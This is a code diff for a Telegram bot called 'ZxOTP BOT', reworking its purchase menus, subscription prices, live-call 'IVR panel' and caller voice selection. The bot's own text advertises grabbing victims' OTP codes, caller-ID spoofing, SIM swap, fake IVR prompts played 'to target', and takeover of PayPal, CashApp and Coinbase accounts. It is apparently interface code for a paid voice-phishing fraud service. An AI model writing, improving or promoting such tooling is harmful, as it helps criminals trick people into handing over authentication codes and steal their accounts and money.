       .emoji(E.ROCKET).plain('  Yearly       — ').bold(PRICE_YR).nl()
       .emoji(E.CROWN).plain('  VIP Lifetime — ').bold(PRICE_VIP).nl(2)
-      .emoji(E.GLOBE).sp().italic('Status: All countries and modes up').nl()
       .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
     const sent = await msgSend(b, ctx.chat.id, m, {
       reply_markup: {
         inline_keyboard: [
-          [btn.green('START GRABBING', 'reply-erro', E.ROBOT)],
-          [btn.gold('PURCHASE',        'payment',   E.MONEY),
-           btn.blue('FEATURES',        'features',  E.STAR)],
-          [btn.teal('FAQ',             'reply-erro', E.QUESTION),
-           btn.blue('SUPPORT',         'admin',      E.SHIELD)],
-          [btn.blue('My Receipts',     'reply-erro', E.RECEIPT)],
-          [btn.teal('BUY/SELL CRYPTO', 'site-respons', E.CARD)],
-          [btn.url('Contact Owner',     OWNER_URL,  E.ENVELOPE)],
+          [btn.gold('Buy a Plan',    'subscription', E.CROWN),
+           btn.blue('Features',      'features',     E.STAR)],
+          [btn.green('Pay Now',      'payment',      E.MONEY),
+           btn.url('Contact Owner',   OWNER_URL,     E.ENVELOPE)],
         ],
       },
     });
@@ -856,21 +654,19 @@ function registerCommands(b: Telegraf): void {
   // /IVRpass ───────────────────────────────────────────────────────────────────
   b.command('IVRpass', (ctx) => {
     const m = new Msg()
-      .emoji(E.TOOLS).sp().bi('ZxOTP BOT — IVR Panel').nl(2)
-      .emoji(E.ANNOUNCE).sp().italic('Background Call Center Audio').plain(' — simulate a call center.').nl()
-      .emoji(E.KEY).sp().italic('Typing Audio').plain(' — simulate keyboard typing.').nl(2)
-      .blockquote('Tip: "Transfer to IVR" lets you choose which script is played.');
+      .emoji(E.TOOLS).sp().bi('Live Call Control').nl(2)
+      .italic('Use while a call is active:');
     msgSend(b, ctx.chat.id, m, {
       reply_markup: {
         inline_keyboard: [
-          [btn.red('Hangup',              'ivr_hangup',       E.RED)],
-          [btn.green('Place call on hold', 'ivr_hold',        E.CHECK)],
-          [btn.teal('Remove from hold',   'ivr_unhold',       E.CANCEL)],
-          [btn.teal('Fake transfer call', 'ivr_fake_xfer',    E.GLOBE)],
-          [btn.blue('Transfer to IVR',    'ivr_real_xfer',    E.ROCKET)],
-          [btn.gold('Fake IVR prompt',    'ivr_fake_prompt',  E.STAR)],
-          [btn.blue('Background audio',   'ivr_bg_audio',     E.ANNOUNCE)],
-          [btn.teal('Typing audio',       'ivr_typing_audio', E.TOOLS)],
+          [btn.red('Hang Up',           'ivr_hangup',       E.RED),
+           btn.green('Hold',            'ivr_hold',         E.CHECK)],
+          [btn.teal('Remove Hold',      'ivr_unhold',       E.CANCEL),
+           btn.teal('Fake Transfer',    'ivr_fake_xfer',    E.GLOBE)],
+          [btn.blue('Transfer to IVR',  'ivr_real_xfer',    E.ROCKET),
+           btn.gold('Fake IVR Prompt',  'ivr_fake_prompt',  E.STAR)],
+          [btn.blue('BG Audio',         'ivr_bg_audio',     E.ANNOUNCE),
+           btn.teal('Typing Audio',     'ivr_typing_audio', E.TOOLS)],
         ],
       },
     });
@@ -938,45 +734,38 @@ function registerCommands(b: Telegraf): void {
   b.command('pgp', (ctx) => {
     gateCommand(b, ctx.from?.id, ctx.chat.id, () => {
       const m = new Msg()
-        .emoji(E.TOOLS).sp().bi('PGP — Transfer Mode').nl(2)
-        .italic('Complete the current call flow first, then use the IVR panel to transfer.').nl(2)
-        .emoji(E.PHONE).sp().bold('Start a call with /call, then use:').nl()
-        .emoji(E.GLOBE).plain(' Hold ').italic('— place call on hold').nl()
-        .emoji(E.ROCKET).plain(' Transfer ').italic('— forward to IVR system').nl()
-        .emoji(E.STAR).plain(' Fake IVR ').italic('— simulate IVR prompt to target').nl(2)
-        .emoji(E.LIGHTNING).sp().bold('/IVRpass').plain(' — open the full IVR control panel');
+        .emoji(E.TOOLS).sp().bi('Live Call Control').nl(2)
+        .italic('Use while a call is active:');
       msgSend(b, ctx.chat.id, m, {
         reply_markup: {
           inline_keyboard: [
-            [btn.blue('Open IVR Panel', 'IVR-content', E.TOOLS)],
-            [btn.teal('Start a Call',   'reply-erro',  E.PHONE)],
+            [btn.red('Hang Up',          'ivr_hangup',      E.RED),
+             btn.green('Hold',           'ivr_hold',        E.CHECK)],
+            [btn.teal('Remove Hold',     'ivr_unhold',      E.CANCEL),
+             btn.teal('Fake Transfer',   'ivr_fake_xfer',   E.GLOBE)],
+            [btn.blue('Transfer to IVR', 'ivr_real_xfer',   E.ROCKET),
+             btn.gold('Fake IVR Prompt', 'ivr_fake_prompt', E.STAR)],
           ],
         },
       });
     });
   });
 
-  // /dpgp — immediate fake transfer panel ───────────────────────────────────────
+  // /dpgp — immediate IVR panel ─────────────────────────────────────────────────
   b.command('dpgp', (ctx) => {
     gateCommand(b, ctx.from?.id, ctx.chat.id, () => {
       const m = new Msg()
-        .emoji(E.ROCKET).sp().bi('DPGP — Direct Transfer').nl(2)
-        .italic('Opens the IVR control panel immediately — use this during an active call to forward, hold, or play a fake IVR prompt.').nl(2)
-        .emoji(E.WARNING).sp().bold('Must have an active call in progress.').nl(2)
-        .plain('  ').emoji(E.RED).plain(' Hangup').nl()
-        .plain('  ').emoji(E.CHECK).plain(' Hold / Unhold').nl()
-        .plain('  ').emoji(E.GLOBE).plain(' Fake Transfer').nl()
-        .plain('  ').emoji(E.ROCKET).plain(' Transfer to real IVR').nl()
-        .plain('  ').emoji(E.STAR).plain(' Fake IVR prompt to target');
+        .emoji(E.TOOLS).sp().bi('Live Call Control').nl(2)
+        .italic('Use while a call is active:');
       msgSend(b, ctx.chat.id, m, {
         reply_markup: {
           inline_keyboard: [
-            [btn.red('Hangup',              'ivr_hangup',      E.RED)],
-            [btn.green('Place on hold',     'ivr_hold',        E.CHECK)],
-            [btn.teal('Remove from hold',   'ivr_unhold',      E.CANCEL)],
-            [btn.teal('Fake transfer',      'ivr_fake_xfer',   E.GLOBE)],
-            [btn.blue('Transfer to IVR',    'ivr_real_xfer',   E.ROCKET)],
-            [btn.gold('Fake IVR prompt',    'ivr_fake_prompt', E.STAR)],
+            [btn.red('Hang Up',          'ivr_hangup',      E.RED),
+             btn.green('Hold',           'ivr_hold',        E.CHECK)],
+            [btn.teal('Remove Hold',     'ivr_unhold',      E.CANCEL),
+             btn.teal('Fake Transfer',   'ivr_fake_xfer',   E.GLOBE)],
+            [btn.blue('Transfer to IVR', 'ivr_real_xfer',   E.ROCKET),
+             btn.gold('Fake IVR Prompt', 'ivr_fake_prompt', E.STAR)],
           ],
         },
       });
@@ -1428,11 +1217,12 @@ function registerCommands(b: Telegraf): void {
 
 function buildInfoMsg(): Msg {
   return new Msg()
-    .emoji(E.STAR).sp().bi('ZxOTP BOT').sp().emoji(E.STAR).nl(2)
-    .emoji(E.CHECK).sp().italic('Any OTP code in 2 minutes').nl()
-    .emoji(E.CHECK).sp().italic('Payments · PayPal · PIN · Sim swap · LOGS').nl()
-    .emoji(E.CHECK).sp().italic('Apple Pay · Venmo · CashApp · Coinbase').nl()
-    .emoji(E.CHECK).sp().italic('PGP — speak as agent with hold music').nl(2)
+    .emoji(E.CROWN).sp().bi('ZxOTP BOT').sp().emoji(E.CROWN).nl(2)
+    .emoji(E.LIGHTNING).sp().italic('OTP calls · Spoof caller ID · Live IVR control').nl(2)
+    .emoji(E.HOURGLASS).plain('  3 Days       — ').bold(PRICE_3D).nl()
+    .emoji(E.LIGHTNING).plain('  Weekly       — ').bold(PRICE_WK).nl()
+    .emoji(E.STAR).plain('  Monthly      — ').bold(PRICE_MO).nl()
+    .emoji(E.CROWN).plain('  VIP Lifetime — ').bold(PRICE_VIP).nl(2)
     .emoji(E.DIAMOND).plain(' Owner: ').bold(OWNER_HANDLE);
 }
 
@@ -1440,13 +1230,10 @@ function infoKeyboard() {
   return {
     reply_markup: {
       inline_keyboard: [
-        [btn.green('SUBSCRIPTION',    'subscription',  E.CHECK)],
-        [btn.gold('PAYMENT-ACCOUNT',  'payment',       E.MONEY)],
-        [btn.blue('Services Info',    'service_info',  E.STAR)],
-        [btn.blue('CMD Guide',        'more-C',        E.ROCKET)],
-        [btn.teal('IVR Panel',        'IVR-content',   E.TOOLS)],
-        [btn.blue('COMMAND GUIDE',    'Command_GUIDE',  E.STAR)],
-        [btn.url('Contact Owner',      OWNER_URL,      E.ENVELOPE)],
+        [btn.gold('Buy a Plan',    'subscription', E.CROWN),
+         btn.blue('CMD Guide',    'more-C',       E.ROCKET)],
+        [btn.green('Pay Now',     'payment',      E.MONEY),
+         btn.url('Contact Owner',  OWNER_URL,     E.ENVELOPE)],
       ],
     },
   };
@@ -1518,17 +1305,16 @@ function buildVoiceMenu(chatId: number): Msg {
   const cur = getUserVoice(chatId);
   const v   = getVoice(cur);
   return new Msg()
-    .emoji(E.STAR).sp().bi('Voice Selection').nl(2)
-    .italic('Choose the voice that speaks on the call.').nl(2)
-    .emoji(E.CHECK).plain(' Current: ').bold(`${v.flag} ${v.label} — ${v.accent}`).nl(2)
-    .blockquote('Click Preview to hear a sample · Use to activate');
+    .emoji(E.STAR).sp().bi('Select Voice').nl(2)
+    .plain('Active: ').bold(`${v.flag} ${v.label}`).plain(` — ${v.accent}`).nl(2)
+    .italic('Preview to hear a sample · Use to activate.');
 }
 
 function voiceKeyboard(currentVoiceId: string) {
   const rows: any[][] = VOICES.map(v => {
     const tick = v.id === currentVoiceId ? ' ✅' : '';
     return [
-      btn.blue(`${v.flag} ${v.label} (${v.accent})${tick}`, `voice_preview:${v.id}`, E.STAR),
+      btn.blue(`${v.flag} ${v.label} — ${v.accent}${tick}`, `voice_preview:${v.id}`, E.STAR),
       btn.green('Use', `voice_use:${v.id}`, E.CHECK),
     ];
   });
